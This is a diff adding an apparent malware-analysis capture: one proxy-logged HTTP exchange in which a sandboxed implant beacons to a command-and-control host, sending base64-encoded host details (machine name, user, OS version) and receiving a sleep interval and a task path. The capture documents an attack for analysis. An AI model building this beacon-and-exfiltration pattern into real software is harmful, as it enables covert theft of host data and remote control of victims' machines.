@@ -1,0 +1,22 @@
+# First exchange from the sandbox run, as seen by the proxy.
+# The host name and the victim values are the sandbox's own.
+
+POST /api/v2/sync HTTP/1.1
+Host: c2.pebble-sandbox.test
+User-Agent: Pebble/2.4 (Win64; build 5521)
+X-Client-Id: 7f3a9c1e5b2d4086
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Connection: close
+
+d=N2YzYTljMWU1YjJkNDA4NnxTQU5EQk9YLTAxfGFuYWx5c3R8V2luZG93cyAxMCAxOTA0NQ==
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0
+Content-Type: application/json
+Content-Length: 50
+
+{"s":"ok","i":300,"t":"/api/v2/task/c41e90ab7d52"}
+
+# After this the implant slept for 300 seconds (the "i" field), then sent a
+# second request. The capture ends here: the sandbox was shut down first.
